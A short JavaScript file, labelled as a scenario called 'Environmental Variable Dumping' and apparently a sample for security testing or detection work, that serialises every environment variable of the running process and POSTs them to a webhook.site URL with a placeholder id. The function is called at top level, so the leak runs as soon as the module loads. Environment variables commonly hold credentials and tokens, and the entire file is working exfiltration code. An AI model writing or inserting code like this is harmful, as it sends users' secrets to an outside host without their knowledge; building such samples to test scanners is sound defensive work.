// Scenario: Environmental Variable Dumping
import https from 'https';

function dumpEnv() {
  const data = JSON.stringify(process.env);
  const req = https.request('https://webhook.site/your-id', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  });
  req.write(data);
  req.end();
}

dumpEnv();
